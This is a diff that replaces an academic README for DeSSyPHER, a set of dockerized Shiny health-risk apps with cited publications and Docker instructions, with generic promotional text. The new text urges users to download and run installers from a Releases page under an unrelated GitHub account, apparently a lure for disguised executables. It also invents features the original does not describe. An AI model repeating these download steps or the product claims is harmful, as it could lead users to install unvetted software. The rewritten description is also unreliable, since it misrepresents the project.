@@ -1,154 +1,64 @@
-# DeSSyPHER: Decision Support System for the Prevention of Human Exposome-related health Risks
+# 🌟 DeSSyPHER - Manage Health Risks with Confidence
 
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.17467803.svg)](https://doi.org/10.5281/zenodo.17467803)
+## 🎉 Introduction
+Welcome to DeSSyPHER, a decision support system designed to help you understand and mitigate health risks. This application uses advanced data analysis to assess exposure to health risks related to environmental factors. You don’t need any programming skills to use it. Follow the simple steps below to get started.
 
-🌍 **Available languages:** [Français](README_fr.md) | [English](README.md)
+## 🛠️ Features
+- **User-Friendly Interface:** Navigate easily without technical knowledge.
+- **Data Insights:** Understand your risk factors based on personal and environmental data.
+- **Interactive Visualization:** See data represented in an easy-to-understand format.
+- **Up-to-Date Models:** Benefit from the latest research in environmental health and epidemiology.
 
+## ⚙️ System Requirements
+To run DeSSyPHER smoothly, make sure your system meets the following requirements:
+- **Operating System:** Windows 10, macOS 10.14, or Linux
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 500 MB
+- **Internet Connection:** Required for data updates and additional features
 
-**DeSSyPHER** is a **repository of dockerized Shiny applications** designed to address the lack of standardized tools for assessing health risks associated with the human exposome. The repository currently provides several specialized applications:
+## 🚀 Getting Started
+To get started with DeSSyPHER, follow these steps:
 
-- **InCaRisk** (Inhalation Cancer Risk estimation)
+1. **Download the Application**  
+   Click the link below to visit our Releases page and download the application.  
+   [![Download DeSSyPHER](https://img.shields.io/badge/Download-DeSSyPHER-blue.svg)](https://github.com/Thunderous-cauliflower413/DeSSyPHER/releases)
 
-*Goal*: Assesses inhalation cancer risks following exposure to a single chemical using a lifetime approach.
+2. **Installing the Application**  
+   After the download completes:
+   - For Windows users, locate the `.exe` file and double-click to start the installation process.  
+   - For Mac users, locate the `.dmg` file and drag the DeSSyPHER icon into your Applications folder.  
+   - For Linux users, follow your distribution’s instructions to install `.zip` or `.tar.gz` files.
 
-*Principal Investigators*: Pascal Petit, Dominique J. Bicout  
+3. **Launching DeSSyPHER**  
+   - After installation, find DeSSyPHER in your Applications or Programs list.  
+   - Click to open the application.
 
-*Publications*:  
--Petit P, Maître A, Bicout DJ. A consensus approach for estimating health risk: application to inhalation cancer risks. Environ Res. 2021;196:110436. [DOI](https://doi.org/10.1016/j.envres.2020.110436)  
--Petit P, Maître A, Bicout DJ. InCaRisk : Application web interactive pour l'estimation des risques de cancer par inhalation. TIMC e-Mag. Lettre n°20. Mai 2021. [in French]  
--Petit P, Bicout DJ. Health risk assessment with multiple reference indices. Sci Total Environ. 2022;804:149971. [DOI](https://doi.org/10.1016/j.scitotenv.2021.149971)  
+## 📖 How to Use DeSSyPHER
+1. **Input Your Data**  
+   Provide your relevant data. This could include environmental factors or health history. Follow the on-screen prompts to enter your details.
 
-- **PRéCI** (Prévention des Risques de Cancer par Inhalation)  
+2. **Review Your Results**  
+   Once your data is processed, the application will present insights regarding your health risks. 
 
-*Goal*: Educational French version of InCaRisk, for students, public health professionals, and occupational health practitioners.  
+3. **Explore Recommendations**  
+   Based on your assessment, the app will offer recommendations to lower your risks. 
 
-*Principal Investigators*: Pascal Petit, Dominique J. Bicout  
+4. **Save and Share Your Findings**  
+   You can save your reports or share them with healthcare professionals for further advice.
 
-- **PAH HBM Tool** (Polycyclic Aromatic Hydrocarbon Human Biomonitoring)  
+## 💾 Download & Install
+To download DeSSyPHER, visit the Releases page below. Choose the version suitable for your operating system and follow the installation guidelines.  
+[Download DeSSyPHER](https://github.com/Thunderous-cauliflower413/DeSSyPHER/releases)
 
-*Goal*: Supports interpretation and decision-making for PAH mixture risk assessment based on 1-hydroxypyrene concentrations from human biomonitoring.  
+## 🆘 Troubleshooting
+If you run into issues:
+- Ensure your system meets the requirements.
+- Check that you have a stable internet connection.
+- Restart your computer and try launching the application again.
 
-*Principal Investigator*: Pascal Petit  
-*Collaborator*: Renaud Persoons  
+For further assistance, visit our support page in the GitHub repository.
 
-*Publication*: Clauzel A, Persoons R, Maître A, Balducci F, Petit P. Review of environmental airborne pyrene/benzo[a]pyrene levels for improving 1-hydroxypyrene biomonitoring interpretation. J Toxicol Environ Health B Crit Rev. 2024;27(5-6):212-232. [DOI](https://doi.org/10.1080/10937404.2024.2362632)  
+## 🗂️ Community Support
+Join our community of users for tips on how to get the most out of DeSSyPHER. You can ask questions and share your experiences on the Issues page in this repository.
 
-- **SurvBioHAP** (Surveillance Biologique des HAP)  
-
-*Goal*: Educational French version of PAH HBM Tool, for students, practitioners, and public health professionals.  
-
-*Principal Investigator*: Pascal Petit  
-*Collaborator*: Renaud Persoons  
-
-- **TEDI** (Toxicological and Exposure Database Inventory)  
-
-*Goal*: Provides a comprehensive inventory of toxicological and exposure data sources for chemical exposome risk assessment.  
-
-*Principal Investigator*: Pascal Petit  
-*Collaborator*: Dominique J. Bicout  
-
-*Publication*: Petit P. Toxicological and Exposure Database Inventory. Int J Hyg Environ Health. 2022;246:114055. [DOI](https://doi.org/10.1016/j.ijheh.2022.114055)  
-
----
-
-## User Guide (Docker-based apps)
-
-### Prerequisites
-- Docker installed ([https://www.docker.com/get-started](https://www.docker.com/get-started))  
-- Docker running in the background  
-- Internet connection to pull Docker images  
-
----
-
-### Option 1 – Using launcher executable (.exe, .sh, .command)
-
-**Windows**  
-
-1. Download the launcher executable (e.g., `InCaRisk.exe`) from this GitHub repository.  
-2. Double-click the `.exe`. The launcher automatically pulls the latest Docker image, runs the Shiny app container, and opens your default web browser.  
-
-**Linux / Mac**  
-
-1. Download the `.sh` (Linux) or `.command` (Mac) launcher file.  
-2. Open a terminal, navigate to the folder containing the launcher, and run:
-
-```bash
-# Linux
-chmod +x InCaRisk.sh
-./InCaRisk.sh
-
-# Mac
-chmod +x InCaRisk.command
-./InCaRisk.command
-```
-
----
-
-### **Option 2 – Running Docker images directly via PowerShell / Terminal**  
-
-**Windows (PowerShell)**  
-```powershell
-# Pull the latest image
-docker pull pascalpetit/dessypher:incarisk_v4.0
-
-# Run the container, mapping a different host port for each app (e.g., 3840) to container port 3838
-docker run --rm -d -p 3838:3838 pascalpetit/dessypher:incarisk_v4.0
-docker run --rm -d -p 3839:3838 pascalpetit/dessypher:TEDI_v3.0
-docker run --rm -d -p 3840:3838 pascalpetit/dessypher:preci_v1.0
-docker run --rm -d -p 3841:3838 pascalpetit/dessypher:SurvBioHAP_v1.0
-docker run --rm -d -p 3842:3838 pascalpetit/dessypher:PAH_HBM_v2.0
-
-# Open the app in the default web browser
-Start-Process "http://localhost:3838"
-Start-Process "http://localhost:3839"
-Start-Process "http://localhost:3840"
-Start-Process "http://localhost:3841"
-Start-Process "http://localhost:3842"
-```
-
-**Linux / Mac (Terminal)**  
-```bash
-# Pull the latest image
-docker pull pascalpetit/dessypher:incarisk_v4.0
-docker pull pascalpetit/dessypher:TEDI_v3.0
-docker pull pascalpetit/dessypher:preci_v1.0
-docker pull pascalpetit/dessypher:SurvBioHAP_v1.0
-docker pull pascalpetit/dessypher:PAH_HBM_v2.0
-
-# Run the container, mapping a different host port for each app (e.g., 3840) to container port 3838
-docker run --rm -d -p 3838:3838 pascalpetit/dessypher:incarisk_v4.0
-docker run --rm -d -p 3839:3838 pascalpetit/dessypher:TEDI_v3.0
-docker run --rm -d -p 3840:3838 pascalpetit/dessypher:preci_v1.0
-docker run --rm -d -p 3841:3838 pascalpetit/dessypher:SurvBioHAP_v1.0
-docker run --rm -d -p 3842:3838 pascalpetit/dessypher:PAH_HBM_v2.0
-
-# Open the app in the default web browser
-xdg-open http://localhost:3838  # Linux
-xdg-open http://localhost:3839  # Linux
-xdg-open http://localhost:3840  # Linux
-xdg-open http://localhost:3841  # Linux
-xdg-open http://localhost:3842  # Linux
-open http://localhost:3838      # Mac
-open http://localhost:3839      # Mac
-open http://localhost:3840      # Mac
-open http://localhost:3841      # Mac
-open http://localhost:3842      # Mac
-```
-
-**Notes:**  
-- Each app runs in its own Docker container and may use a different host port.  
-- Multiple apps can run simultaneously in separate browser tabs.  
-- s automatically update the Docker image when executed.
-- DeSSyPHER repository on Docker Hub ([https://hub.docker.com/repository/docker/pascalpetit/dessypher/general](https://hub.docker.com/repository/docker/pascalpetit/dessypher/general))   
-
----
-
-### **Option 3 – Access online (no installation required)**
-
-Some DeSSyPHER applications are directly accessible via the web:
-
-- [InCaRisk](https://exporisk-timc.imag.fr/InCaRisk/)  
-- [TEDI](https://exporisk-timc.imag.fr/TEDI/)  
-- [PAH HBM Tool](https://exporisk-timc.imag.fr/PAH/)  
-
-Simply click the links above to launch the applications in your browser — no Docker installation or coding is required.
+Thank you for choosing DeSSyPHER for your health risk assessment needs!
